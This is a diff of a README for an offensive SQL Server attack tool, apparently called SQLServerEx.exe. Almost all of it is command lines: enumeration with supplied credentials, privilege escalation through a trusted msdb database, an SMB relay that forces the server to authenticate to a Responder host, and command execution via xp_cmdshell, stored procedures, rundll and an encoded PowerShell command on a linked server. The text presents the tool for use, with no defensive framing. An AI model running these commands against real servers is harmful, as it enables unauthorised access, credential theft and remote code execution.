@@ -11,22 +11,42 @@ Could be executed in both interactive and non-interactive modes providing comman
 * PrivEsc via user impersonation and db_owner vectors.
 * Reflective loading via exposed StartR method.
 
-#### Some of the running modes:
+#### SQL server enumeration:
 
-Server enumeration under current domain user context or with supplied credentials:
+Could be done under current domain user context or with supplied credentials:
 
 ```
 SQLServerEx.exe -s SQLSERVER1 -d master
 SQLServerEx.exe -s SQLSERVER1 -u sa -p Password1
 ```
+`-d` is an optional target database to connect. Defaults to master. Credentials are optional too.
 
-Command execution:
+Privilege escalation via trusted database:
 
 ```
-SQLServerEx.exe -s SQLSERVER1 -d master -e relay -r RESPONDER2
-SQLServerEx.exe -s SQLSERVER1 -e link -l LINKEDSQLSERVER3
-SQLServerEx.exe -s SQLSERVER1 -e xpshell -i sa
-SQLServerEx.exe -s SQLSERVER1 -e sp -i dbo
+SQLServerEx.exe -s SQLSERVER1 -e escalate -o msdb
+SQLServerEx.exe -s SQLSERVER1 -u user -p MyPassword! -e escalate -o msdb
+```
+
+#### Command execution
+
+SMB relay. Forces the SQL server to authenticate against SMB share:
+
+```
+SQLServerEx.exe -s SQLSERVER1 -d master -e relay -r RESPONDER
+```
+
+Various command execution methods:
+
+```
+SQLServerEx.exe -s SQLSERVER1 -e xpshell -i sa -c whoami
+SQLServerEx.exe -s SQLSERVER1 -e sp -i dbo -c whoami
 SQLServerEx.exe -s SQLSERVER1 -e rundll -i sa
-SQLServerEx.exe -s SQLSERVER1 -u user -p MyPassword! -e escalate -o VulnAppDb
+```
+`-i` is an optional user to impersonate. Defaults to sa.
+
+Command exec on the linked SQL server:
+
+```
+SQLServerEx.exe -s SQLSERVER1 -i sa -e link -l LINKEDSQLSERVER3 -c "powershell -enc ZQBjAG"
 ```
